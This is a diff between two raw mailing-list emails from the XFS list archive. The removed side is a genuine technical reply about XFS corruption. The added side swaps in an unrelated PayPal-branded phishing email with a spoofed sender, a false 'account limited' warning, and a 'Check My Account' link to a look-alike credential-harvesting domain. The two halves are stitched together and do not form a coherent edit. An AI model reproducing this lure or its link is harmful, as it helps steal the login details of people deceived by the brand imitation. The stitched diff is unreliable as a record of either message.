@@ -1,26 +1,19 @@
 Return-Path: <xfs-bounces@oss.sgi.com>
 Received: from relay.sgi.com (relay1.corp.sgi.com [137.38.102.111])
-	by oss.sgi.com (Postfix) with ESMTP id D6F767F5A
-	for <xfs@oss.sgi.com>; Tue,  1 Dec 2015 06:18:45 -0600 (CST)
-Received: from cuda.sgi.com (cuda1.sgi.com [192.48.157.11])
-	by relay1.corp.sgi.com (Postfix) with ESMTP id A97258F8035
-	for <xfs@oss.sgi.com>; Tue,  1 Dec 2015 04:18:42 -0800 (PST)
-Received: from mail1.bemta14.messagelabs.com (mail1.bemta14.messagelabs.com
-	[193.109.254.110]) by cuda.sgi.com with ESMTP id
-	1aOsMsAFXJb62V2W (version=TLSv1.2
-	cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO) for
-	<xfs@oss.sgi.com>; Tue, 01 Dec 2015 04:18:39 -0800 (PST)
-From: Sandeep Patel <spatel@omnifone.com>
-Subject: RE: XFS corruptions
-Date: Tue, 1 Dec 2015 12:18:21 +0000
-Message-ID: <558408F298C8CE4C89D93BD56AB474E8018617C636@EXBE1IS02.omnifone.com>
-References: <558408F298C8CE4C89D93BD56AB474E8018617B2B3@EXBE1IS02.omnifone.com>
-	<20151130184048.3fa123e0@harpe.intellique.com>
-	<558408F298C8CE4C89D93BD56AB474E8018617B3A6@EXBE1IS02.omnifone.com>
-	<20151130194554.6140bf30@harpe.intellique.com>
-In-Reply-To: <20151130194554.6140bf30@harpe.intellique.com>
-Content-Language: en-US
-MIME-Version: 1.0
+	by oss.sgi.com (Postfix) with ESMTP id C65767F5A
+	for <xfs@oss.sgi.com>; Tue,  1 Dec 2015 06:44:06 -0600 (CST)
+Received: from cuda.sgi.com (cuda2.sgi.com [192.48.176.25])
+	by relay1.corp.sgi.com (Postfix) with ESMTP id B5FE18F8035
+	for <xfs@oss.sgi.com>; Tue,  1 Dec 2015 04:44:06 -0800 (PST)
+Received: from CRMSrv.DC05.loc ([23.29.99.117]) by cuda.sgi.com with ESMTP id
+	HVheB6isnSZ1vZRt for <xfs@oss.sgi.com>;
+	Tue, 01 Dec 2015 04:44:03 -0800 (PST)
+Date: Tue, 1 Dec 2015 04:26:47 -0800
+Mime-version: 1.0
+Subject: PayPal : Your Account Has Been Limited Until We Hear From You
+From: PayPal <PayPal@support.com>
+Message-Id: <20151201042647.OHOEIFVWEDYRCH@support.com>
+Reply-To: PayPal@support.com
 List-Id: XFS Filesystem from SGI <xfs.oss.sgi.com>
 List-Unsubscribe: <http://oss.sgi.com/mailman/options/xfs>,
 	<mailto:xfs-request@oss.sgi.com?subject=unsubscribe>
@@ -29,62 +22,236 @@ List-Post: <mailto:xfs@oss.sgi.com>
 List-Help: <mailto:xfs-request@oss.sgi.com?subject=help>
 List-Subscribe: <http://oss.sgi.com/mailman/listinfo/xfs>,
 	<mailto:xfs-request@oss.sgi.com?subject=subscribe>
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: multipart/mixed; boundary="===============6894491009636181973=="
 Errors-To: xfs-bounces@oss.sgi.com
 Sender: xfs-bounces@oss.sgi.com
-To: Emmanuel Florac <eflorac@intellique.com>
-Cc: "xfs@oss.sgi.com" <xfs@oss.sgi.com>
+To: xfs <xfs@oss.sgi.com>
 
-WWVzLCB0aGV5IG9ubHkgdGhpbmcgd2UgY2hhbmdlZCBmcm9tIGRlZmF1bHQgaXMgdGhlIGlzaXpl
-LgoKV2UgYXJlIHJ1bm5pbmcgdGhlIGxhdGVzdCB2ZXJzaW9uIG9uIHRoZSBmaXJtd2FyZS4gV2Ug
-cHJldmlvdXNseSB1cGdyYWRlZCB0aGUgZmlybXdhcmUgb24gdGhlc2UgdGhpbmtpbmcgaXQgd291
-bGQgc29sdmUgdGhlIHByb2JsZW0uCgpUaGUgcHJvYmxlbXMgc2VlbSB0byBvY2N1ciBhdCByYW5k
-b20uIFRoZSBsb2FkIHRvIHRoZXNlIHVuaXRzIGFyZSBxdWl0ZSBtaW5pbWFsIGF0IHRoZSBtb21l
-bnQgYW5kIHdlIGFyZSBzdGlsbCBoYXZpbmcgaXNzdWVzLiAKClRoYW5rcwpTYW5kZWVwCgotLS0t
-LU9yaWdpbmFsIE1lc3NhZ2UtLS0tLQpGcm9tOiBFbW1hbnVlbCBGbG9yYWMgW21haWx0bzplZmxv
-cmFjQGludGVsbGlxdWUuY29tXSAKU2VudDogMzAgTm92ZW1iZXIgMjAxNSAxODo0NgpUbzogU2Fu
-ZGVlcCBQYXRlbApDYzogeGZzQG9zcy5zZ2kuY29tClN1YmplY3Q6IFJlOiBYRlMgY29ycnVwdGlv
-bnMKCkxlIE1vbiwgMzAgTm92IDIwMTUgMTg6MDY6NTUgKzAwMDAKU2FuZGVlcCBQYXRlbCA8c3Bh
-dGVsQG9tbmlmb25lLmNvbT4gw6ljcml2YWl0OgoKPiBIaSBFbW1hbnVlbCwKPiAKPiBUaGFua3Mg
-Zm9yIHRoZSByZXNwb25zZS4KPiAKPiAgW3Jvb3RAZ2MwMDNiIH5dIyB4ZnNfaW5mbyAvZGV2L3Nk
-Ygo+IG1ldGEtZGF0YT0vZGV2L3NkYiAgICAgICAgICAgICAgIGlzaXplPTUxMiAgICBhZ2NvdW50
-PTUyLAo+IGFnc2l6ZT0yNjg0MzU0NTUgYmxrcyA9ICAgICAgICAgICAgICAgICAgICAgICBzZWN0
-c3o9NDA5NiAgYXR0cj0yLAo+IHByb2ppZDMyYml0PTEgPSAgICAgICAgICAgICAgICAgICAgICAg
-Y3JjPTAKPiBkYXRhICAgICA9ICAgICAgICAgICAgICAgICAgICAgICBic2l6ZT00MDk2ICAgYmxv
-Y2tzPTEzOTE2MTc2Mzg0LAo+IGltYXhwY3Q9MSA9ICAgICAgICAgICAgICAgICAgICAgICBzdW5p
-dD0wICAgICAgc3dpZHRoPTAgYmxrcwo+IG5hbWluZyAgID12ZXJzaW9uIDIgICAgICAgICAgICAg
-IGJzaXplPTQwOTYgICBhc2NpaS1jaT0wCj4gbG9nICAgICAgPWludGVybmFsICAgICAgICAgICAg
-ICAgYnNpemU9NDA5NiAgIGJsb2Nrcz01MjE3MjgsIHZlcnNpb249Mgo+ICAgICAgICAgID0gICAg
-ICAgICAgICAgICAgICAgICAgIHNlY3Rzej00MDk2ICBzdW5pdD0xIGJsa3MsCj4gbGF6eS1jb3Vu
-dD0xIHJlYWx0aW1lID1ub25lICAgICAgICAgICAgICAgICAgIGV4dHN6PTQwOTYgICBibG9ja3M9
-MCwKPiBydGV4dGVudHM9MAoKTG9va3MgcGxhaW4gZGVmYXVsdHMuLi4geW91IGRpZG4ndCBhcHBs
-eSBhbnkgY3VzdG9taXphdGlvbiwgZGlkIHlvdT8KCj4gCj4gV2UgaGF2ZSAxOCBub2RlcyBlYWNo
-IHdpdGggMiBvZiB0aGVzZSBhcnJheXMgYW5kIHdlIGFyZSBzZWVpbmcgdGhpcyAKPiBhY3Jvc3Mg
-dGhlIGJvYXJkLgoKSHVtLCBzdHJhbmdlLCBhcmUgeW91IHJ1bm5pbmcgdGhlIGxhdGVzdCBSQUlE
-IGZpcm13YXJlIG9uIHRoZSBjb250cm9sbGVycz8KCkRvZXMgdGhpcyBoYXBwZW4gbW9yZSBvZnRl
-biB3aGVuIHRoZSBhcnJheSBpcyByZWJ1aWxkaW5nLCBvciB2ZXJpZnlpbmcsIG9yIHdoZW4gdGhl
-IHN5c3RlbSBpcyB1bmRlciBoZWF2eSBJTz8gT3IgZG9lcyBpdCBoYXBwZW4ganVzdCBjb21wbGV0
-ZWx5IGF0IHJhbmRvbT8KIAo+IEkgaGF2ZSB1cGRhdGVkIHRoZSB4ZnNwcm9ncyB0byAzLjEuMTEt
-MS4wLjYuZWw2Lng4Nl82NCB3aGljaCBpcyB0aGUgCj4gbGF0ZXN0IHZlcnNpb24gYXZhaWxhYmxl
-IG9uIG91ciB5dW0gcmVwby4KCklmIHlvdSdyZSBub3QgYWZyYWlkIG9mIHJ1bm5pbmcgYmluYXJp
-ZXMgZnJvbSB1bmtub3duIHNvdXJjZSwgaGVyZSdzIGEKNC4yLjAgdmVyc2lvbiBJJ3ZlIGJ1aWx0
-IHJlY2VudGx5OgpodHRwOi8vdXBkYXRlLmludGVsbGlxdWUuY29tL3B1Yi94ZnNfcmVwYWlyLTQu
-Mi4wLmd6CiAKCi0tCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpFbW1hbnVlbCBGbG9yYWMgICAgIHwgICBEaXJl
-Y3Rpb24gdGVjaG5pcXVlCiAgICAgICAgICAgICAgICAgICAgfCAgIEludGVsbGlxdWUKICAgICAg
-ICAgICAgICAgICAgICB8CTxlZmxvcmFjQGludGVsbGlxdWUuY29tPgogICAgICAgICAgICAgICAg
-ICAgIHwgICArMzMgMSA3OCA5NCA4NCAwMgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCl9fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18K
-VGhpcyBlbWFpbCBoYXMgYmVlbiBzY2FubmVkIGJ5IHRoZSBTeW1hbnRlYyBFbWFpbCBTZWN1cml0
-eS5jbG91ZCBzZXJ2aWNlLgpGb3IgbW9yZSBpbmZvcm1hdGlvbiBwbGVhc2UgdmlzaXQgaHR0cDov
-L3d3dy5zeW1hbnRlY2Nsb3VkLmNvbSBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpfX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fClRoaXMg
-ZW1haWwgaGFzIGJlZW4gc2Nhbm5lZCBieSB0aGUgU3ltYW50ZWMgRW1haWwgU2VjdXJpdHkuY2xv
-dWQgc2VydmljZS4KRm9yIG1vcmUgaW5mb3JtYXRpb24gcGxlYXNlIHZpc2l0IGh0dHA6Ly93d3cu
-c3ltYW50ZWNjbG91ZC5jb20KX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwpfX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fXwp4ZnMgbWFpbGluZyBsaXN0Cnhmc0Bvc3Muc2dpLmNvbQpo
-dHRwOi8vb3NzLnNnaS5jb20vbWFpbG1hbi9saXN0aW5mby94ZnMK
+This message is in MIME format. Since your mail reader does not understand
+this format, some or all of this message may not be legible.
+
+--===============6894491009636181973==
+Content-Type: multipart/alternative; Boundary="--=BOUNDARY_121426_IXXO_WOON_OWWS_TYWF"
+
+This message is in MIME format. Since your mail reader does not understand
+this format, some or all of this message may not be legible.
+
+----=BOUNDARY_121426_IXXO_WOON_OWWS_TYWF
+Content-Type: text/plain; charset="ISO-8859-1"; format=flowed
+Content-transfer-encoding: quoted-printable
+
+
+
+
+
+----=BOUNDARY_121426_IXXO_WOON_OWWS_TYWF
+Content-Type: text/html; charset="ISO-8859-1"
+Content-transfer-encoding: quoted-printable
+
+<!DOCTYPE html>
+
+<!--
+______   ______    _______   _______  _______     .______   ____    ____   =
+      ___      .__   __.   ______   .__   __.  __       _______..___  ___. =
+     ___
+/      | /  __  \  |       \ |   ____||       \    |   _  \  \   \  /   /  =
+      /   \     |  \ |  |  /  __  \  |  \ |  | |  |     /       ||   \/   |=
+     /   \
+|  ,----'|  |  |  | |  .--.  ||  |__   |  .--.  |   |  |_)  |  \   \/   /  =
+      /  ^  \    |   \|  | |  |  |  | |   \|  | |  |    |   (----`|  \  /  =
+|    /  ^  \
+|  |     |  |  |  | |  |  |  ||   __|  |  |  |  |   |   _  <    \_    _/   =
+     /  /_\  \   |  . `  | |  |  |  | |  . `  | |  |     \   \    |  |\/|  =
+|   /  /_\  \
+|  `----.|  `--'  | |  '--'  ||  |____ |  '--'  |   |  |_)  |     |  |     =
+    /  _____  \  |  |\   | |  `--'  | |  |\   | |  | .----)   |   |  |  |  =
+|  /  _____  \
+\______| \______/  |_______/ |_______||_______/    |______/      |__|      =
+  /__/     \__\ |__| \__|  \______/  |__| \__| |__| |_______/    |__|  |__|=
+ /__/     \__\
+
+-->
+
+
+
+
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3DUTF-8"><meta name=3D"viewport" content=3D"width=3Ddevice-width; initial-=
+scale=3D1.0; maximum-scale=3D1.0; user-scalable=3D0;">
+<style type=3D"text/css">body { width: 100% !important;}</style>
+</head>
+<body  style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 40px; PADDING-LEFT: 0px; =
+MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #e9e9e9">
+<table style=3D"WIDTH: 100%"> <tbody><tr>
+<td style=3D" BACKGROUND-COLOR: #e9e9e9" align=3D"center">
+<table width=3D"600" border=3D"0">
+<tbody><tr>
+<td> <div>
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" border=3D"0">
+<tbody>
+<tr>
+<td  style=3D" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius: 10px =
+10px 0px 0px">
+
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"left" bor=
+der=3D"0">
+<tbody>
+<tr>
+<td>
+<div style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;margin-le=
+ft:30px">
+<p align=3D"left" >
+
+<div  style=3D"FONT-SIZE: 10px; FONT-FAMILY: Arial black; COLOR: #919191">
+<p style=3D"FONT-SIZE: 22px"><strong><em><font color=3D"#253b80">Pay</font>=
+<font color=3D"#179bd7">Pal</font></em></strong><font size=3D"1"><sub> Secu=
+re
+</sub></font></p></div></p>
+
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div><table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" border=
+=3D"0">
+<tbody>
+<tr>
+<td style=3D" BACKGROUND: #F3F3FF; ; LINE-HEIGHT: 22px">
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"left" bor=
+der=3D"0">
+<tbody>
+<tr>
+<td>
+<div>
+<p align=3D"justify" style=3D"PADDING-LEFT: 30px; PADDING-RIGHT: 30px ;FONT=
+-FAMILY: Arial; COLOR: #747474 ;FONT-SIZE: 15px"><strong>Dear Client,</stro=
+ng><br>
+We have noticed that some data from your account information seems inaccura=
+te or unverified. You have to check your information in order to continue u=
+sing our service smoothly, please check your account information by clickin=
+g the link below.
+</p> </div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div><div>
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" border=3D"0">
+<tbody>
+<tr>
+<td style=3D" BACKGROUND: #ffffff;  LINE-HEIGHT: 27px">
+
+<table width=3D"600" align=3D"left" border=3D"0">
+<tbody>
+<tr>
+<td>
+<div><p style=3D"margin-left:30px"><a onclick=3D"return true" href=3D"http:=
+//update-your-information-account-and-login.com.update-you-information-and-=
+login-rapmusic.co/update-your-information-account/confirm/security/8631c3f5=
+bf8c90b25853ddf4f51236f9/?dispatch=3DDz2b69GNUPhlA222iccVYP8GugOo7D9LccWjlD=
+6gsoB3qE5JQi&email=3D" ><span style=3D"FONT-SIZE: 14px;   FONT-FAMILY: Aria=
+l;  WIDTH: 200px;   COLOR: #fff; TEXT-ALIGN: center;   DISPLAY: inline-bloc=
+k; BACKGROUND-COLOR: #16AEFF;border-radius:7px"><strong>Check My Account</s=
+trong></span> </a></p> </div>
+</td>
+</tr>
+</tbody>
+</table></td>
+</tr>
+</tbody>
+</table>
+</div><div>
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" border=3D"0">
+<tbody>
+<tr>
+<td  style=3D" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius:0px 0p=
+x 10px 10px">
+
+<table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"left" bor=
+der=3D"0">
+<tbody>
+<tr>
+<td>
+<div style=3D"FONT-SIZE: 11px; FONT-FAMILY: Arial; COLOR: #747474;margin-le=
+ft:30px;margin-right:30px"><hr size=3D"2" color=3D"#F0F0F0" width=3D"100%">=
+
+<p align=3D"center" >
+|
+Help
+|
+Contact
+|
+Fees
+|
+Security
+|
+Apps
+|
+Shop
+|
+Ebay
+|
+Secure
+</p>
+<hr size=3D"2" color=3D"#F0F0F0" width=3D"100%"></td>
+</tr>
+</tbody>
+</table>
+
+</td>
+</tr>
+</tbody>
+</table>
+</div></td>
+</tr> <tr>
+<td style=3D" PADDING-TOP: 10px; " align=3D"center">
+<div style=3D"FONT-SIZE: 9px; FONT-FAMILY: Arial; COLOR: #959595;margin-lef=
+t:30px;margin-right:30px">
+
+
+<p>
+
+
+If you need help or have any questions, call us at 65-6510-4584, 7:00 WIB t=
+o 21:00 WIB from Monday to Friday, 8:00 WIB to 17:00 WIB from Saturday to S=
+unday
+</p>
+</div>
+</td>
+</tr> </tbody>
+</table>
+</td>
+</tr>
+
+</tbody></table>
+
+</body></html>
+
+----=BOUNDARY_121426_IXXO_WOON_OWWS_TYWF--
+
+
+
+--===============6894491009636181973==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+xfs mailing list
+xfs@oss.sgi.com
+http://oss.sgi.com/mailman/listinfo/xfs
+
+--===============6894491009636181973==--
